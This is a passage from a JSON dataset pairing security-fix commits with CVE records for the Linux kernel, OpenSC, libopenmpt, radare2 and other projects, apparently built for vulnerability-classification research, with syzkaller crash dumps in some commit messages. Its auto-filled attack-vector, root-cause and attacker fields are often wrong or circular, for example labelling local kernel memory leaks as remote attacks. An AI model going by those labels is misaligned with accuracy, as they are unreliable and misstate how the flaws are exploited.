via\nsi_mem_available(). GFP_USER is far less limiting memory exhaustion\nthan the test via si_mem_available().\n\nThis will avoid dom0 running out of memory due to excessive foreign\npage mappings especially on ARM and on x86 in PVH mode, as those don't\nhave a pre-ballooned area which can be used for foreign mappings.\n\nAs the normal ballooning suffers from the same problem don't balloon\ndown more than si_mem_available() pages in one iteration. At the same\ntime limit the default maximum number of retries.\n\nThis is part of XSA-300.\n\nSigned-off-by: Juergen Gross <jgross@suse.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"An issue was discovered in drivers\/xen\/balloon.c in the Linux kernel before 5.2.3, as used in Xen through 4.12.x, allowing guest OS users to cause a denial of service because of unrestricted resource consumption during the mapping of guest memory, aka CID-6ef36ab967c7.","commit_message_1":"let alloc_xenballooned_pages ( ) fail if not enough memory free commit a1078e821b605813b63bf6bca414a85f804d5c66 upstream","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By sending a specially crafted request to the backend","Impact":"cause a denial of service","Root Cause":"caused by the lack of a grant table and foreign mapping limits","Attack Type":"attacker"},{"commit_id":"fc80ab45621bd966f70594c0b7393ec005a94007","cve_id":"CVE-2019-17178","cwe_id":"CWE-772","commit_message":"Fixed #5645: realloc return handling","summary":"HuffmanTree_makeFromFrequencies in lodepng.c in LodePNG through 2019-09-28, as used in WinPR in FreeRDP and other products, has a memory leak because a supplied realloc pointer (i.e., the first argument to realloc) is also used for a realloc return value.","commit_message_1":"fixed # <number> : realloc return handling","Vulnerability Type":"memory leak","Attack Vector":"By sending a specially-crafted realloc pointer value","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"927688ddab43c2b203569de79407a899e734fabe","cve_id":"CVE-2019-17113","cwe_id":"CWE-120","commit_message":"[Fix] libmodplug: C API: Limit the length of strings copied to the output buffer of ModPlug_InstrumentName() and ModPlug_SampleName() to 32 bytes (including terminating null) as is done by original libmodplug. This avoids potential buffer overflows in software relying on this limit instead of querying the required buffer size beforehand. libopenmpt can return strings longer than 32 bytes here beacuse the internal limit of 32 bytes applies to strings encoded in arbitrary character encodings but the API returns them converted to UTF-8, which can be longer. (reported by Antonio Morales Maldonado of Semmle Security Research Team)\n\ngit-svn-id: https:\/\/source.openmpt.org\/svn\/openmpt\/trunk\/OpenMPT@12127 56274372-70c3-4bfc-bfc3-4c3a0b034d27","summary":"In libopenmpt before 0.3.19 and 0.4.x before 0.4.9, ModPlug_InstrumentName and ModPlug_SampleName in libopenmpt_modplug.c do not restrict the lengths of libmodplug output-buffer strings in the C API, leading to a buffer overflow.","commit_message_1":"c api : limit the length of string copied to the output buffer of modplug_instrumentname ( ) and modplug_samplename ( ) to <number> byte ( including terminating null ) a is done by original libmodplug","Vulnerability Type":"Classic Buffer Overflow","Attack Vector":"By sending an overly long string","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by improper bounds checking by the ModPlug_InstrumentName and ModPlug_SampleName functions","Attack Type":"remote attacker"},{"commit_id":"6caabe7f197d3466d238f70915d65301f1716626","cve_id":"CVE-2019-16995","cwe_id":"CWE-772","commit_message":"net: hsr: fix memory leak in hsr_dev_finalize()\n\nIf hsr_add_port(hsr, hsr_dev, HSR_PT_MASTER) failed to\nadd port, it directly returns res and forgets to free the node\nthat allocated in hsr_create_self_node(), and forgets to delete\nthe node->mac_list linked in hsr->self_node_db.\n\nBUG: memory leak\nunreferenced object 0xffff8881cfa0c780 (size 64):\n  comm \"syz-executor.0\", pid 2077, jiffies 4294717969 (age 2415.377s)\n  hex dump (first 32 bytes):\n    e0 c7 a0 cf 81 88 ff ff 00 02 00 00 00 00 ad de  ................\n    00 e6 49 cd 81 88 ff ff c0 9b 87 d0 81 88 ff ff  ..I.............\n  backtrace:\n    [<00000000e2ff5070>] hsr_dev_finalize+0x736\/0x960 [hsr]\n    [<000000003ed2e597>] hsr_newlink+0x2b2\/0x3e0 [hsr]\n    [<000000003fa8c6b6>] __rtnl_newlink+0xf1f\/0x1600 net\/core\/rtnetlink.c:3182\n    [<000000001247a7ad>] rtnl_newlink+0x66\/0x90 net\/core\/rtnetlink.c:3240\n    [<00000000e7d1b61d>] rtnetlink_rcv_msg+0x54e\/0xb90 net\/core\/rtnetlink.c:5130\n    [<000000005556bd3a>] netlink_rcv_skb+0x129\/0x340 net\/netlink\/af_netlink.c:2477\n    [<00000000741d5ee6>] netlink_unicast_kernel net\/netlink\/af_netlink.c:1310 [inline]\n    [<00000000741d5ee6>] netlink_unicast+0x49a\/0x650 net\/netlink\/af_netlink.c:1336\n    [<000000009d56f9b7>] netlink_sendmsg+0x88b\/0xdf0 net\/netlink\/af_netlink.c:1917\n    [<0000000046b35c59>] sock_sendmsg_nosec net\/socket.c:621 [inline]\n    [<0000000046b35c59>] sock_sendmsg+0xc3\/0x100 net\/socket.c:631\n    [<00000000d208adc9>] __sys_sendto+0x33e\/0x560 net\/socket.c:1786\n    [<00000000b582837a>] __do_sys_sendto net\/socket.c:1798 [inline]\n    [<00000000b582837a>] __se_sys_sendto net\/socket.c:1794 [inline]\n    [<00000000b582837a>] __x64_sys_sendto+0xdd\/0x1b0 net\/socket.c:1794\n    [<00000000c866801d>] do_syscall_64+0x147\/0x600 arch\/x86\/entry\/common.c:290\n    [<00000000fea382d9>] entry_SYSCALL_64_after_hwframe+0x49\/0xbe\n    [<00000000e01dacb3>] 0xffffffffffffffff\n\nFixes: c5a759117210 (\"net\/hsr: Use list_head (and rcu) instead of array for slave devices.\")\nReported-by: Hulk Robot <hulkci@huawei.com>\nSigned-off-by: Mao Wenan <maowenan@huawei.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel before 5.0.3, a memory leak exits in hsr_dev_finalize() in net\/hsr\/hsr_device.c if hsr_add_port fails to add a port, which may cause denial of service, aka CID-6caabe7f197d.","commit_message_1":"hsr : fix memory leak in hsr_dev_finalize ( ) if hsr_add_port ( hsr , hsr_dev , hsr_pt_master ) failed to add port , it directly return re and forgets to free the node that allocated in hsr_create_self_node ( ) , and forgets to delete the node- > mac_list linked in hsr- > self_node_db","Vulnerability Type":"memory leak","Attack Vector":"By sending a specially-crafted packet","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"07f12b26e21ab359261bf75cfcb424fdc7daeb6d","cve_id":"CVE-2019-16994","cwe_id":"CWE-772","commit_message":"net: sit: fix memory leak in sit_init_net()\n\nIf register_netdev() is failed to register sitn->fb_tunnel_dev,\nit will go to err_reg_dev and forget to free netdev(sitn->fb_tunnel_dev).\n\nBUG: memory leak\nunreferenced object 0xffff888378daad00 (size 512):\n  comm \"syz-executor.1\", pid 4006, jiffies 4295121142 (age 16.115s)\n  hex dump (first 32 bytes):\n    00 e6 ed c0 83 88 ff ff 00 00 00 00 00 00 00 00  ................\n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\nbacktrace:\n    [<00000000d6dcb63e>] kvmalloc include\/linux\/mm.h:577 [inline]\n    [<00000000d6dcb63e>] kvzalloc include\/linux\/mm.h:585 [inline]\n    [<00000000d6dcb63e>] netif_alloc_netdev_queues net\/core\/dev.c:8380 [inline]\n    [<00000000d6dcb63e>] alloc_netdev_mqs+0x600\/0xcc0 net\/core\/dev.c:8970\n    [<00000000867e172f>] sit_init_net+0x295\/0xa40 net\/ipv6\/sit.c:1848\n    [<00000000871019fa>] ops_init+0xad\/0x3e0 net\/core\/net_namespace.c:129\n    [<00000000319507f6>] setup_net+0x2ba\/0x690 net\/core\/net_namespace.c:314\n    [<0000000087db4f96>] copy_net_ns+0x1dc\/0x330 net\/core\/net_namespace.c:437\n    [<0000000057efc651>] create_new_namespaces+0x382\/0x730 kernel\/nsproxy.c:107\n    [<00000000676f83de>] copy_namespaces+0x2ed\/0x3d0 kernel\/nsproxy.c:165\n    [<0000000030b74bac>] copy_process.part.27+0x231e\/0x6db0 kernel\/fork.c:1919\n    [<00000000fff78746>] copy_process kernel\/fork.c:1713 [inline]\n    [<00000000fff78746>] _do_fork+0x1bc\/0xe90 kernel\/fork.c:2224\n    [<000000001c2e0d1c>] do_syscall_64+0xc8\/0x580 arch\/x86\/entry\/common.c:290\n    [<00000000ec48bd44>] entry_SYSCALL_64_after_hwframe+0x49\/0xbe\n    [<0000000039acff8a>] 0xffffffffffffffff\n\nSigned-off-by: Mao Wenan <maowenan@huawei.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel before 5.0, a memory leak exists in sit_init_net() in net\/ipv6\/sit.c when register_netdev() fails to register sitn->fb_tunnel_dev, which may cause denial of service, aka CID-07f12b26e21a.","commit_message_1":"sit : fix memory leak in sit_init_net ( ) if register_netdev ( ) is failed to register sitn- > fb_tunnel_dev , it will go to err_reg_dev and forget to free netdev ( sitn- > fb_tunnel_dev )","Vulnerability Type":"memory leak","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"c1fbf8ab5d73cff5e1f45236995857c75ba4128d","cve_id":"CVE-2019-16930","cwe_id":"CWE-755","commit_message":"Ignore exceptions when deserializing note plaintexts","summary":"Zcashd in Zcash before 2.0.7-3 allows discovery of the IP address of a full node that owns a shielded address, related to mishandling of exceptions during deserialization of note plaintexts. This affects anyone who has disclosed their zaddr to a third party.","commit_message_1":"ignore exception when deserializing note plaintexts","Vulnerability Type":"Improper Handling of Exceptional Conditions","Attack Vector":"mishandling of exceptions during deserialization of note plaintexts","Impact":"obtain sensitive information","Root Cause":"caused by mishandling of exceptions during deserialization of note plaintexts","Attack Type":"remote attacker"},{"commit_id":"33f66ba6fd234114aa37f0209dac031bb2870a9b","cve_id":"CVE-2019-16910","cwe_id":"CWE-200","commit_message":"Merge remote-tracking branch 'upstream-restricted\/pr\/556' into mbedtls-2.16-restricted","summary":"Arm Mbed TLS before 2.19.0 and Arm Mbed Crypto before 2.0.0, when deterministic ECDSA is enabled, use an RNG with insufficient entropy for blinding, which might allow an attacker to recover a private key via side-channel attacks if a victim signs the same message many times. (For Mbed TLS, the fix is also available in versions 2.7.12 and 2.16.3.)","commit_message_1":"merge remote-tracking branch 'upstream-restricted\/pr\/<number> ' into mbedtls-<file>-restricted","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via side - channel attacks if a victim signs the same message many times","Impact":"recover a private key","Root Cause":"caused by the use of an RNG with improper entropy for blinding","Attack Type":"remote attacker"},{"commit_id":"dd739f5a45b3af3d1f65f00fe19af1dbfec7aea7","cve_id":"CVE-2019-16718","cwe_id":"CWE-78","commit_message":"Fix #14990 - multiple quoted command parsing issue ##core\n\n\t> \"?e hello\"\"?e world\"\n\thello\n\tworld\"\n\t> \"?e hello\";\"?e world\"\n\thello\n\tworld","summary":"In radare2 before 3.9.0, a command injection vulnerability exists in bin_symbols() in libr\/core\/cbin.c. By using a crafted executable file, it's possible to execute arbitrary shell commands with the permissions of the victim. This vulnerability is due to an insufficient fix for CVE-2019-14745 and improper handling of symbol names embedded in executables.","commit_message_1":"fix # <number> - multiple quoted command parsing issue # # core","Vulnerability Type":"command injection","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"execute arbitrary commands","Root Cause":"caused by improper handling of symbol names embedded","Attack Type":"remote attacker"},{"commit_id":"7d0a06586b2686ba80c4a2da5f91cb10ffbea736","cve_id":"CVE-2019-16714","cwe_id":"CWE-200","commit_message":"net\/rds: Fix info leak in rds6_inc_info_copy()\n\nThe rds6_inc_info_copy() function has a couple struct members which\nare leaking stack information.  The ->tos field should hold actual\ninformation and the ->flags field needs to be zeroed out.\n\nFixes: 3eb450367d08 (\"rds: add type of service(tos) infrastructure\")\nFixes: b7ff8b1036f0 (\"rds: Extend RDS API for IPv6 support\")\nReported-by: \u9ec4ID\u8774\u8776 <butterflyhuangxx@gmail.com>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Ka-Cheong Poon <ka-cheong.poon@oracle.com>\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel before 5.2.14, rds6_inc_info_copy in net\/rds\/recv.c allows attackers to obtain sensitive information from kernel stack memory because tos and flags fields are not initialized.","commit_message_1":"fix info leak in rds6_inc_info_copy ( ) the rds6_inc_info_copy ( ) function ha a couple struct member which are leaking stack information","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially-crafted request","Impact":"obtain sensitive information","Root Cause":"caused by the failure to initialize the tos and flags fields","Attack Type":"remote attacker"},{"commit_id":"37d939a6f511d16d4c95678025c235fe62e6417a","cve_id":"CVE-2019-16347","cwe_id":"CWE-119","commit_message":"fix deinterlacing for small pictures\n\nfixes #12","summary":"ngiflib 0.4 has a heap-based buffer overflow in WritePixels() in ngiflib.c when called from DecodeGifImg, because deinterlacing for small pictures is mishandled.","commit_message_1":"fix deinterlacing for small picture","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the WritePixels function","Attack Type":"remote attacker"},{"commit_id":"4097828d7cc87589864fecf452f2cd46c5f37180","cve_id":"CVE-2019-16163","cwe_id":"CWE-400","commit_message":"fix #147: Stack Exhaustion Problem caused by some parsing functions in regcomp.c making recursive calls to themselves.","summary":"Oniguruma before 6.9.3 allows Stack Exhaustion in regcomp.c because of recursion in regparse.c.","commit_message_1":"stack exhaustion problem caused by some parsing function in <file> making recursive call to themselves","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By persuading a victim to compile a specially crafted file and execute its object code","Impact":"cause a denial of service","Root Cause":"caused by stack exhaustion","Attack Type":"remote attacker"},{"commit_id":"9827d5a0298ee766f6041db9c0080166ff6cdce8","cve_id":"CVE-2019-16161","cwe_id":"CWE-476","commit_message":"Merge pull request #134 from k-takata\/fix-segv-in-error-str\n\nFix SEGV in onig_error_code_to_str() (Fix #132)","summary":"Onigmo through 6.2.0 has a NULL pointer dereference in onig_error_code_to_str because of fetch_token in regparse.c.","commit_message_1":"merge pull request # <number> from k-takata\/fix-segv-in-error-str","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to compile a specially crafted file and execute its object code","Impact":"cause a denial of service","Root Cause":"caused a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"d150b60e1e14c261b113f55681419ad1dfa8a76c","cve_id":"CVE-2019-16058","cwe_id":"CWE-119","commit_message":"Use EVP_PKEY_size() to allocate correct size of signature buffer. (#18)\n\nDo not use fixed buffer size for signature, EVP_SignFinal() requires\nbuffer for signature at least  EVP_PKEY_size(pkey) bytes in size.\n\nFixes crash when using 4K RSA signatures (https:\/\/github.com\/OpenSC\/pam_p11\/issues\/16, https:\/\/github.com\/OpenSC\/pam_p11\/issues\/15)","summary":"An issue was discovered in the pam_p11 component 0.2.0 and 0.3.0 for OpenSC. If a smart card creates a signature with a length longer than 256 bytes, this triggers a buffer overflow. This may be the case for RSA keys with 4096 bits depending on the signature scheme.","commit_message_1":"use evp_pkey_size ( ) to allocate correct size of signature buffer","Vulnerability Type":"buffer overflow","Attack Vector":"By using a smart card to create a signature with a length longer than 256 bytes","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"creates a signature with a length longer than 256 bytes","Attack Type":"remote attacker"},{"commit_id":"a3fc7693f3a035a8a7921cffb98432944bb42740","cve_id":"CVE-2019-15946","cwe_id":"CWE-119","commit_message":"Fixed out of bounds access in ASN.1 Octet string\n\nCredit to OSS-Fuzz","summary":"OpenSC before 0.20.0-rc1 has an out-of-bounds access of an ASN.1 Octet string in asn1_decode_entry in libopensc\/asn1.c.","commit_message_1":"fixed out of bound access in <file> octet string","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has an out - of - bounds access of an asn . 1 octet string","Attack Type":"remote attacker"},{"commit_id":"412a6142c27a5973c61ba540e33cdc22d5608e68","cve_id":"CVE-2019-15945","cwe_id":"CWE-119","commit_message":"fixed out of bounds access of ASN.1 Bitstring\n\nCredit to OSS-Fuzz","summary":"OpenSC before 0.20.0-rc1 has an out-of-bounds access of an ASN.1 Bitstring in decode_bit_string in libopensc\/asn1.c.","commit_message_1":"fixed out of bound access of <file> bitstring","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has an out - of - bounds access of an asn . 1 bitstring","Attack Type":"remote attacker"},{"commit_id":"01ca667133d019edc9f0a1f70a272447c84ec41f","cve_id":"CVE-2019-15924","cwe_id":"CWE-476","commit_message":"fm10k: Fix a potential NULL pointer dereference\n\nSyzkaller report this:\n\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN PTI\nCPU: 0 PID: 4378 Comm: syz-executor.0 Tainted: G         C        5.0.0+ #5\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04\/01\/2014\nRIP: 0010:__lock_acquire+0x95b\/0x3200 kernel\/locking\/lockdep.c:3573\nCode: 00 0f 85 28 1e 00 00 48 81 c4 08 01 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f c3 4c 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 0f 85 cc 24 00 00 49 81 7d 00 e0 de 03 a6 41 bc 00 00\nRSP: 0018:ffff8881e3c07a40 EFLAGS: 00010002\nRAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000\nRDX: 0000000000000010 RSI: 0000000000000000 RDI: 0000000000000080\nRBP: 0000000000000000 R08: 0000000000000001 R09: 0000000000000000\nR10: ffff8881e3c07d98 R11: ffff8881c7f21f80 R12: 0000000000000001\nR13: 0000000000000080 R14: 0000000000000000 R15: 0000000000000001\nFS:  00007fce2252e700(0000) GS:ffff8881f2400000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007fffc7eb0228 CR3: 00000001e5bea002 CR4: 00000000007606f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nPKRU: 55555554\nCall Trace:\n lock_acquire+0xff\/0x2c0 kernel\/locking\/lockdep.c:4211\n __mutex_lock_common kernel\/locking\/mutex.c:925 [inline]\n __mutex_lock+0xdf\/0x1050 kernel\/locking\/mutex.c:1072\n drain_workqueue+0x24\/0x3f0 kernel\/workqueue.c:2934\n destroy_workqueue+0x23\/0x630 kernel\/workqueue.c:4319\n __do_sys_delete_module kernel\/module.c:1018 [inline]\n __se_sys_delete_module kernel\/module.c:961 [inline]\n __x64_sys_delete_module+0x30c\/0x480 kernel\/module.c:961\n do_syscall_64+0x9f\/0x450 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\nRIP: 0033:0x462e99\nCode: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48\nRSP: 002b:00007fce2252dc58 EFLAGS: 00000246 ORIG_RAX: 00000000000000b0\nRAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000020000140\nRBP: 0000000000000002 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000246 R12: 00007fce2252e6bc\nR13: 00000000004bcca9 R14: 00000000006f6b48 R15: 00000000ffffffff\n\nIf alloc_workqueue fails, it should return -ENOMEM, otherwise may\ntrigger this NULL pointer dereference while unloading drivers.\n\nReported-by: Hulk Robot <hulkci@huawei.com>\nFixes: 0a38c17a21a0 (\"fm10k: Remove create_workqueue\")\nSigned-off-by: Yue Haibing <yuehaibing@huawei.com>\nTested-by: Andrew Bowers <andrewx.bowers@intel.com>\nSigned-off-by: Jeff Kirsher <jeffrey.t.kirsher@intel.com>","summary":"An issue was discovered in the Linux kernel before 5.0.11. fm10k_init_module in drivers\/net\/ethernet\/intel\/fm10k\/fm10k_main.c has a NULL pointer dereference because there is no -ENOMEM upon an alloc_workqueue failure.","commit_message_1":"fix a potential null pointer dereference syzkaller report this : kasan : gpf could be caused by null-ptr deref or user memory access general protection fault : <number> [ # <number> ] smp kasan pti cpu : <number> pid : <number> comm : syz-<file> tainted : g c <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"An issue was discovered in the Linux kernel before 5.0.11. fm10k_init_module in drivers\/net\/ethernet\/intel\/fm10k\/fm10k_main.c","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer deference","Attack Type":"remote attacker"},{"commit_id":"f0d1762554014ce0ae347b9f0d088f2c157c8c72","cve_id":"CVE-2019-15923","cwe_id":"CWE-476","commit_message":"paride\/pcd: Fix potential NULL pointer dereference and mem leak\n\nSyzkaller report this:\n\npcd: pcd version 1.07, major 46, nice 0\npcd0: Autoprobe failed\npcd: No CD-ROM drive found\nkasan: CONFIG_KASAN_INLINE enabled\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN PTI\nCPU: 1 PID: 4525 Comm: syz-executor.0 Not tainted 5.1.0-rc3+ #8\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04\/01\/2014\nRIP: 0010:pcd_init+0x95c\/0x1000 [pcd]\nCode: c4 ab f7 48 89 d8 48 c1 e8 03 80 3c 28 00 74 08 48 89 df e8 56 a3 da f7 4c 8b 23 49 8d bc 24 80 05 00 00 48 89 f8 48 c1 e8 03 <80> 3c 28 00 74 05 e8 39 a3 da f7 49 8b bc 24 80 05 00 00 e8 cc b2\nRSP: 0018:ffff8881e84df880 EFLAGS: 00010202\nRAX: 00000000000000b0 RBX: ffffffffc155a088 RCX: ffffffffc1508935\nRDX: 0000000000040000 RSI: ffffc900014f0000 RDI: 0000000000000580\nRBP: dffffc0000000000 R08: ffffed103ee658b8 R09: ffffed103ee658b8\nR10: 0000000000000001 R11: ffffed103ee658b7 R12: 0000000000000000\nR13: ffffffffc155a778 R14: ffffffffc155a4a8 R15: 0000000000000003\nFS:  00007fe71bee3700(0000) GS:ffff8881f7300000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 000055a7334441a8 CR3: 00000001e9674003 CR4: 00000000007606e0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nPKRU: 55555554\nCall Trace:\n ? 0xffffffffc1508000\n ? 0xffffffffc1508000\n do_one_initcall+0xbc\/0x47d init\/main.c:901\n do_init_module+0x1b5\/0x547 kernel\/module.c:3456\n load_module+0x6405\/0x8c10 kernel\/module.c:3804\n __do_sys_finit_module+0x162\/0x190 kernel\/module.c:3898\n do_syscall_64+0x9f\/0x450 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\nRIP: 0033:0x462e99\nCode: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48\nRSP: 002b:00007fe71bee2c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139\nRAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99\nRDX: 0000000000000000 RSI: 0000000020000180 RDI: 0000000000000003\nRBP: 00007fe71bee2c70 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000246 R12: 00007fe71bee36bc\nR13: 00000000004bcefa R14: 00000000006f6fb0 R15: 0000000000000004\nModules linked in: pcd(+) paride solos_pci atm ts_fsm rtc_mt6397 mac80211 nhc_mobility nhc_udp nhc_ipv6 nhc_hop nhc_dest nhc_fragment nhc_routing 6lowpan rtc_cros_ec memconsole intel_xhci_usb_role_switch roles rtc_wm8350 usbcore industrialio_triggered_buffer kfifo_buf industrialio asc7621 dm_era dm_persistent_data dm_bufio dm_mod tpm gnss_ubx gnss_serial serdev gnss max2165 cpufreq_dt hid_penmount hid menf21bmc_wdt rc_core n_tracesink ide_gd_mod cdns_csi2tx v4l2_fwnode videodev media pinctrl_lewisburg pinctrl_intel iptable_security iptable_raw iptable_mangle iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 iptable_filter bpfilter ip6_vti ip_vti ip_gre ipip sit tunnel4 ip_tunnel hsr veth netdevsim vxcan batman_adv cfg80211 rfkill chnl_net caif nlmon dummy team bonding vcan bridge stp llc ip6_gre gre ip6_tunnel tunnel6 tun joydev mousedev ppdev kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel aesni_intel aes_x86_64 crypto_simd\n ide_pci_generic piix input_leds cryptd glue_helper psmouse ide_core intel_agp serio_raw intel_gtt ata_generic i2c_piix4 agpgart pata_acpi parport_pc parport floppy rtc_cmos sch_fq_codel ip_tables x_tables sha1_ssse3 sha1_generic ipv6 [last unloaded: bmc150_magn]\nDumping ftrace buffer:\n   (ftrace buffer empty)\n---[ end trace d873691c3cd69f56 ]---\n\nIf alloc_disk fails in pcd_init_units, cd->disk will be\nNULL, however in pcd_detect and pcd_exit, it's not check\nthis before free.It may result a NULL pointer dereference.\n\nAlso when register_blkdev failed, blk_cleanup_queue() and\nblk_mq_free_tag_set() should be called to free resources.\n\nReported-by: Hulk Robot <hulkci@huawei.com>\nFixes: 81b74ac68c28 (\"paride\/pcd: cleanup queues when detection fails\")\nSigned-off-by: YueHaibing <yuehaibing@huawei.com>\n\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"An issue was discovered in the Linux kernel before 5.0.9. There is a NULL pointer dereference for a cd data structure if alloc_disk fails in drivers\/block\/paride\/pf.c.","commit_message_1":"fix potential null pointer dereference and mem leak syzkaller report this : pcd : pcd version <file> , major <number> , nice <number> pcd0 : autoprobe failed pcd : no cd-rom drive found kasan : config_kasan_inline enabled kasan : gpf could be caused by null-ptr deref or user memory access general protection fault : <number> [ # <number> ] smp kasan pti cpu : <number> pid : <number> comm : syz-<file> not tainted <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"An issue was discovered in the Linux kernel before 5.0.9","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer deference for a cd data structure if alloc_disk fails","Attack Type":"remote attacker"},{"commit_id":"58ccd2d31e502c37e108b285bf3d343eb00c235b","cve_id":"CVE-2019-15922","cwe_id":"CWE-476","commit_message":"paride\/pf: Fix potential NULL pointer dereference\n\nSyzkaller report this:\n\npf: pf version 1.04, major 47, cluster 64, nice 0\npf: No ATAPI disk detected\nkasan: CONFIG_KASAN_INLINE enabled\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN PTI\nCPU: 0 PID: 9887 Comm: syz-executor.0 Tainted: G         C        5.1.0-rc3+ #8\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04\/01\/2014\nRIP: 0010:pf_init+0x7af\/0x1000 [pf]\nCode: 46 77 d2 48 89 d8 48 c1 e8 03 80 3c 28 00 74 08 48 89 df e8 03 25 a6 d2 4c 8b 23 49 8d bc 24 80 05 00 00 48 89 f8 48 c1 e8 03 <80> 3c 28 00 74 05 e8 e6 24 a6 d2 49 8b bc 24 80 05 00 00 e8 79 34\nRSP: 0018:ffff8881abcbf998 EFLAGS: 00010202\nRAX: 00000000000000b0 RBX: ffffffffc1e4a8a8 RCX: ffffffffaec50788\nRDX: 0000000000039b10 RSI: ffffc9000153c000 RDI: 0000000000000580\nRBP: dffffc0000000000 R08: ffffed103ee44e59 R09: ffffed103ee44e59\nR10: 0000000000000001 R11: ffffed103ee44e58 R12: 0000000000000000\nR13: ffffffffc1e4b028 R14: 0000000000000000 R15: 0000000000000020\nFS:  00007f1b78a91700(0000) GS:ffff8881f7200000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007f6d72b207f8 CR3: 00000001d5790004 CR4: 00000000007606f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nPKRU: 55555554\nCall Trace:\n ? 0xffffffffc1e50000\n do_one_initcall+0xbc\/0x47d init\/main.c:901\n do_init_module+0x1b5\/0x547 kernel\/module.c:3456\n load_module+0x6405\/0x8c10 kernel\/module.c:3804\n __do_sys_finit_module+0x162\/0x190 kernel\/module.c:3898\n do_syscall_64+0x9f\/0x450 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\nRIP: 0033:0x462e99\nCode: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48\nRSP: 